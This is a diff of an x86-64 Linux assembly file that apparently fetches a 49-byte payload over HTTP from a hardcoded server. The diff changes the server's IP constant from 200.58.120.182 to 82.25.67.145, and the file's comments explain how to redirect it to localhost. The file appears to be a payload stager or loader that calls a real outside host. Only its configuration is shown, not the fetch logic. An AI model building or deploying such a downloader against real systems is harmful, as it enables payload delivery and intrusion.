@@ -1,7 +1,7 @@
 ;==============================================================================================================================
 ; Archivo      : payload-read-http-file-size-fixed-checksum.asm
 ; Creado       : 12/02/2025
-; Modificado   : 12/02/2025
+; Modificado   : 06/05/2025
 ; Autor        : Gastón M. González
 ; Plataforma   : Linux
 ; Arquitectura : x86-64
@@ -27,7 +27,7 @@
 ;        db "Host: pithase.com.ar", 0x0D, 0x0A
 ; por -> db "Host: localhost", 0x0D, 0x0A
 ;
-;        server_ip    equ 0xB6783AC8   ; IP [200.58.120.182] del servidor en little endian
+;        server_ip    equ 0x91431952   ; IP [82.25.67.145] del servidor en little endian
 ; por -> server_ip    equ 0x0100007F   ; IP [127.0.0.1] en little endian
 ;
 ;        http_port    equ 0x5000       ; puerto 80 en little endian
@@ -54,7 +54,7 @@ section .rodata
              db 0x0D, 0x0A, 0
     http_get_len equ $ - http_get
 
-    server_ip    equ 0xB6783AC8   ; IP [200.58.120.182] del servidor en little endian
+    server_ip    equ 0x91431952   ; IP [82.25.67.145] del servidor en little endian
     http_port    equ 0x5000       ; puerto 80 en little endian
     payload_len  equ 49           ; tamaño hardcodeado del payload
 
